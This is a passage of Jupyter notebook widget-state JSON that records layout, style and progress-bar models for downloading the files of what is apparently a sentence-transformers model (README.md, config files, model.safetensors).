          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "bac558f35e974dc89c18bbd62be2f7c3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "b781d2435e814ac79ea661d3dddeb738": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_5e2e94778efe43acb1551d2d6c9327e9",
              "IPY_MODEL_c7904bbdeefa484ebcf2987d8af82885",
              "IPY_MODEL_31d6b10cca6041868335aeeb3be76559"
            ],
            "layout": "IPY_MODEL_dac82008b23f4613afbff98fe0516e2a"
          }
        },
        "5e2e94778efe43acb1551d2d6c9327e9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_430c0df0b1f542f392609cfc93ff265b",
            "placeholder": "​",
            "style": "IPY_MODEL_1e7e0d5f36d049a7a138130a7207eaf6",
            "value": "README.md: 100%"
          }
        },
        "c7904bbdeefa484ebcf2987d8af82885": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ea167b4e5bf941b6b0a13a76b744f119",
            "max": 94551,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_91f2784ae8e54e54a281f0686e4343e3",
            "value": 94551
          }
        },
        "31d6b10cca6041868335aeeb3be76559": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6ff3b16153e74b9a874ed97cd95602c3",
            "placeholder": "​",
            "style": "IPY_MODEL_b07c2e8c36f547319e557598390b947d",
            "value": " 94.6k/94.6k [00:00&lt;00:00, 5.63MB/s]"
          }
        },
        "dac82008b23f4613afbff98fe0516e2a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "430c0df0b1f542f392609cfc93ff265b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "1e7e0d5f36d049a7a138130a7207eaf6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ea167b4e5bf941b6b0a13a76b744f119": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "91f2784ae8e54e54a281f0686e4343e3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "6ff3b16153e74b9a874ed97cd95602c3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b07c2e8c36f547319e557598390b947d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "a457e0ae59914b36a3e501ad73052e21": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_99a0796c473143dbb2267b2effac7118",
              "IPY_MODEL_f63db6739ffa4955af34b3c22093d1a5",
              "IPY_MODEL_98b70ec844704832930ee9c26bfaf067"
            ],
            "layout": "IPY_MODEL_65f32545dc8b4e6d94f2b9f1e42c99d6"
          }
        },
        "99a0796c473143dbb2267b2effac7118": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_adec4a6e7897419f85f9222f2c60c713",
            "placeholder": "​",
            "style": "IPY_MODEL_5bfe9cbf26e94dc6ab1089d50c0daa27",
            "value": "sentence_bert_config.json: 100%"
          }
        },
        "f63db6739ffa4955af34b3c22093d1a5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_0ce2501b49bd41b0853ab58cefdf2e6f",
            "max": 52,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_1afb9df36afb49ac8b80318c7afc1fca",
            "value": 52
          }
        },
        "98b70ec844704832930ee9c26bfaf067": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_cab589458dd94467a596ee09136b7df9",
            "placeholder": "​",
            "style": "IPY_MODEL_ca9317acfc4f44b6959d952c47b2cf95",
            "value": " 52.0/52.0 [00:00&lt;00:00, 2.21kB/s]"
          }
        },
        "65f32545dc8b4e6d94f2b9f1e42c99d6": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "adec4a6e7897419f85f9222f2c60c713": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5bfe9cbf26e94dc6ab1089d50c0daa27": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "0ce2501b49bd41b0853ab58cefdf2e6f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "1afb9df36afb49ac8b80318c7afc1fca": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "cab589458dd94467a596ee09136b7df9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ca9317acfc4f44b6959d952c47b2cf95": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "da7b45e9e462467fb02dcc934aa2c596": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_2d3e0c1c4dfd4cd3b8c0a1d2b0d3cfc4",
              "IPY_MODEL_b305e96f1cda40ee894a5f6ec8e032c5",
              "IPY_MODEL_e9408461b3224e7c910b0ad7a2359a7e"
            ],
            "layout": "IPY_MODEL_39a86b401fd247e9b07c5d9066cb5ec9"
          }
        },
        "2d3e0c1c4dfd4cd3b8c0a1d2b0d3cfc4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_81885dc1491a4589a68cc3a80bc817f8",
            "placeholder": "​",
            "style": "IPY_MODEL_7c8abf2ba9a741ef8525da2651996ae1",
            "value": "config.json: 100%"
          }
        },
        "b305e96f1cda40ee894a5f6ec8e032c5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_60b63195037d4c22bb6ef839d8c67e3f",
            "max": 777,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_ac2a72ea1dad4b2d83931200f8778792",
            "value": 777
          }
        },
        "e9408461b3224e7c910b0ad7a2359a7e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_d8c4e64ac78d4699922bf08ec80b9287",
            "placeholder": "​",
            "style": "IPY_MODEL_d2d901bd064c4eaab21e3a63163a3e15",
            "value": " 777/777 [00:00&lt;00:00, 58.0kB/s]"
          }
        },
        "39a86b401fd247e9b07c5d9066cb5ec9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "81885dc1491a4589a68cc3a80bc817f8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7c8abf2ba9a741ef8525da2651996ae1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "60b63195037d4c22bb6ef839d8c67e3f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ac2a72ea1dad4b2d83931200f8778792": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "d8c4e64ac78d4699922bf08ec80b9287": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d2d901bd064c4eaab21e3a63163a3e15": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9304ecfbd0ad4b4d81a9890b6fa21157": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_6a766f57968e4581bb5f85ac72f4b2f1",
              "IPY_MODEL_bbe9c78158ec42f2abb2793b6ecce837",
              "IPY_MODEL_58eeaed329324a77b38425d51a2174de"
            ],
            "layout": "IPY_MODEL_5e97111dee904076a424c8d0580dcca6"
          }
        },
        "6a766f57968e4581bb5f85ac72f4b2f1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_3866a036e89843659ee745dfa9d806bb",
            "placeholder": "​",
            "style": "IPY_MODEL_2df8c0f20c1248d48b1a4379a14b8f26",
            "value": "model.safetensors: 100%"
          }
        },
        "bbe9c78158ec42f2abb2793b6ecce837": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
